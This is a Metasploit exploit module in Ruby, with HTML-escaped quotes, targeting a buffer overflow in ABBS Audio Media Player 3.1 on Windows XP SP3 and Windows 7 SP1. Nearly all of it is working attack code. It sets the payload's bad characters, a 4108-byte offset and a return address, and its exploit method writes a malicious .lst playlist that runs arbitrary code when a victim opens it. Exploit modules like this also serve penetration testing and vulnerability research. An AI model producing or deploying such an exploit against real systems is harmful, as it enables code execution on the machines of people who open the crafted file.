 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ABBS Audio Media Player .LST Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in ABBS Audio Media Player. The vulnerability
        occurs when adding an .lst, allowing arbitrary code execution with the privileges
        of the user running the application . This module has been tested successfully on
        ABBS Audio Media Player 3.1 over Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Julian Ahrens&#039;, # Vulnerability discovery and PoC
          &#039;modpr0be <modpr0be[at]spentera.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;75096&#039; ],
          [ &#039;EDB&#039;, &#039;25204&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;        => "\x00\x0a\x0d",
          &#039;DisableNops&#039;     => true,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;ABBS Audio Media Player 3.1 / Windows XP SP3 / Windows 7 SP1&#039;,
            {
              &#039;Ret&#039;     => 0x00412c91, # add esp,14 # pop # pop # pop # ret from amp.exe
              &#039;Offset&#039;  => 4108,
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jun 30 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.lst&#039;]),
      ], self.class)
 
  end
 
  def exploit
    buffer = payload.encoded
    buffer << rand_text(target[&#039;Offset&#039;] - (payload.encoded.length))
    buffer << [target.ret].pack(&#039;V&#039;)
 
    file_create(buffer)
  end
end

